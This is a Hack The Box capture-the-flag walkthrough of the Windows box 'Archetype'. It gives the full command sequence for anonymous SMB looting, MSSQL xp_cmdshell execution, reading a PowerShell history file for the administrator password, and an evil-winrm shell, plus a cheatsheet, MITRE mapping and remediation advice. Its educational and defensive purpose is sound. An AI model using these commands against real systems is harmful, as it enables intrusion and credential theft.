---
title: "Archetype"
platform: "Hack The Box"
category: "Active Directory"
difficulty: "Very Easy"
date: 2026-07-18
techniques: ["SMB Null Session", "Credentials in Files", "MSSQL xp_cmdshell", "PowerShell History", "Pass-the-Password", "WinRM"]
description: "Anonymous SMB access leaks an MSSQL service password from a config file. sysadmin rights enable xp_cmdshell for code execution, and a plaintext administrator password left in PowerShell history leads to full compromise."
lang: en
translation_key: archetype
---

| Info | Detail |
|------|--------|
| Platform | Hack The Box — Starting Point (Tier 2) |
| Category | Windows / Active Directory Fundamentals |
| Difficulty | Very Easy |
| Flags | user + root (redacted — HTB flags regenerate on each spawn/reset) |

---

## Objective
Compromise a Windows Server 2019 host by chaining an anonymous SMB share, a leaked service-account credential, MSSQL command execution, and a plaintext password recovered from PowerShell history to escalate from an unauthenticated position to `Administrator`.

---

## Context
Archetype is an introductory Windows box that models a common real-world failure chain: a database service account whose credentials are stored in cleartext inside a configuration file on a world-readable share. It exercises the core "enumerate → loot → authenticate → execute → escalate" workflow that underpins most internal-network engagements, and introduces the standard offensive tooling against Windows targets (`smbclient`, Impacket's `mssqlclient`, `evil-winrm`) from a Linux attack host.

The full kill chain is:

1. Anonymous SMB session exposes a non-default `backups` share.
2. An SSIS configuration file (`prod.dtsConfig`) leaks the `sql_svc` MSSQL password.
3. `sql_svc` holds the `sysadmin` role, allowing `xp_cmdshell` to be enabled for OS command execution (**user flag**).
4. The PowerShell console history contains the `Administrator` password in cleartext, used over WinRM for full compromise (**root flag**).

---

## Reconnaissance

### Nmap
```bash
nmap -Pn -sC -sV 10.129.103.102
```

Key results:
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Host script results:
| smb-security-mode:
|   account_used: guest
|_  message_signing: disabled (dangerous, but default)
```

### Service breakdown

| Port | Service | Role in the chain |
|------|---------|-------------------|
| 135 / 139 | MSRPC / NetBIOS | Windows infrastructure (supporting) |
| 445 | SMB | Entry point — `account_used: guest` signals anonymous access |
| 1433 | MSSQL 2017 | Second stage — authenticated with looted credentials |
| 5985 | WinRM (HTTPAPI) | Final stage — administrator shell via `evil-winrm` |

### Observations
- `account_used: guest` in the SMB security mode is the first tell: the host permits a null/guest session, so shares can be enumerated without credentials.
- `message_signing: disabled` is a secondary weakness (relay potential) but is not required for this path.
- No web application is present; this is a pure network-service box, unlike typical web targets.

---

## Exploitation

### 1 — SMB enumeration (Initial Access)
List shares over an anonymous session:
```bash
smbclient -N -L //10.129.103.102/
```
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```
`ADMIN$`, `C$`, and `IPC$` are default administrative shares. **`backups`** is non-default and readable — the target of interest.

Enter the share and retrieve its contents:
```bash
smbclient -N //10.129.103.102/backups
smb: \> ls
smb: \> get prod.dtsConfig
smb: \> exit
```

### 2 — Credential looting
The retrieved file is an SSIS package configuration (XML). Read it locally:
```bash
cat prod.dtsConfig
```
The connection string exposes the MSSQL service credentials in cleartext:
```
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;
Auto Translate=False;</ConfiguredValue>
```
- **User:** `ARCHETYPE\sql_svc`
- **Password:** `M3g4c0rp123`

### 3 — MSSQL access and command execution (Foothold → user flag)
Connect to MSSQL using Impacket. Because the account is a Windows account (`DOMAIN\user`), Windows authentication is required:
```bash
impacket-mssqlclient ARCHETYPE/sql_svc:'M3g4c0rp123'@10.129.103.102 -windows-auth
```

Confirm `sysadmin` membership, then enable `xp_cmdshell`:
```sql
SELECT IS_SRVROLEMEMBER('sysadmin');   -- returns 1

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXEC xp_cmdshell 'whoami';             -- archetype\sql_svc
```

Command execution as `archetype\sql_svc` is confirmed. Read the user flag:
```sql
EXEC xp_cmdshell 'type C:\Users\sql_svc\Desktop\user.txt';
```
> **User flag captured.** (Values are redacted — HTB flags regenerate on each spawn/reset.)

### 4 — Privilege escalation (root flag)
Windows records PowerShell commands (via PSReadLine) in a per-user history file. Read `sql_svc`'s history:
```sql
EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
```
```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```
The administrator mapped a drive using their own credentials, leaving the password in history:
- **User:** `administrator`
- **Password:** `MEGACORP_4dm1n!!`

Authenticate over WinRM as `administrator` (the account is reused, i.e. pass-the-password):
```bash
evil-winrm -i 10.129.103.102 -u administrator -p 'MEGACORP_4dm1n!!'
```
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
```
> **Root flag captured.** Full compromise achieved.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|----|
| Discovery | Network Share Discovery | T1135 |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 |
| Initial Access / Lateral Movement | Valid Accounts | T1078 |
| Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 |
| Credential Access | Unsecured Credentials: PowerShell History | T1552.001 |
| Lateral Movement | Remote Services: Windows Remote Management | T1021.006 |

**Related weakness:** CWE-522 (Insufficiently Protected Credentials) — cleartext credentials stored in configuration files and shell history.

---

## Key Concepts Learned

| Concept | Takeaway |
|---------|----------|
| SMB null session | `smbclient -N` succeeds only when the host allows anonymous/guest access — itself a misconfiguration. |
| Non-default shares | `ADMIN$`, `C$`, `IPC$` are noise; custom shares (`backups`) are where loot lives. |
| Interactive tool context | Inside `smbclient` (`smb: \>`) only SMB verbs work; download with `get`, then read with Linux tools. |
| `xp_cmdshell` | An MSSQL extended stored procedure that runs OS commands — disabled by default, re-enabled if the account is `sysadmin`. |
| PowerShell history | `ConsoleHost_history.txt` frequently stores cleartext credentials typed by administrators. |
| Pass-the-password | Credentials for one service (a mapped drive) are commonly reused for privileged logon (WinRM). |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service discovery |
| smbclient | SMB share enumeration and file retrieval |
| impacket-mssqlclient | Authenticated MSSQL connection and command execution |
| evil-winrm | Administrator shell over WinRM (5985) |

---

## Commands & Techniques Cheatsheet
```bash
# Recon
nmap -Pn -sC -sV <IP>

# SMB — enumerate and loot
smbclient -N -L //<IP>/
smbclient -N //<IP>/backups
#   smb:\> ls ; get prod.dtsConfig ; exit
cat prod.dtsConfig

# MSSQL — authenticated command execution
impacket-mssqlclient DOMAIN/user:'PASS'@<IP> -windows-auth
#   SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
#   SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;
#   SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
#   SQL> EXEC xp_cmdshell 'whoami';

# Privesc — read PowerShell history
#   SQL> EXEC xp_cmdshell 'type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';

# Administrator shell
evil-winrm -i <IP> -u administrator -p 'PASS'
```

---

## Remediation
- **Never store credentials in configuration files or shares.** Use a secrets manager (e.g. Windows Credential Manager, HashiCorp Vault) and inject secrets at runtime.
- **Disable anonymous/guest SMB access** and require authentication and SMB signing on all shares.
- **Apply least privilege to service accounts.** `sql_svc` should not hold the `sysadmin` role; scope database permissions to what the application requires.
- **Keep `xp_cmdshell` disabled** and alert on `sp_configure` changes that re-enable it.
- **Clear or disable PowerShell history** for sensitive/service accounts, and never pass credentials as plaintext command arguments (`net use`, etc.).

---

## Reflection
Archetype is a compact demonstration of how a single cleartext credential compounds into full host compromise. No exploit or CVE is involved — every step abuses configuration and hygiene failures: an anonymous share, a hardcoded password, an over-privileged service account, and a password left in shell history. The lesson that generalizes to real engagements is that **credential hygiene is the control that matters most**; the authorization boundaries were technically intact, but plaintext secrets rendered them irrelevant. From an attacker's perspective, the box reinforces a methodical habit — enumerate every service, loot every readable file, and always check history artifacts before reaching for anything more complex.
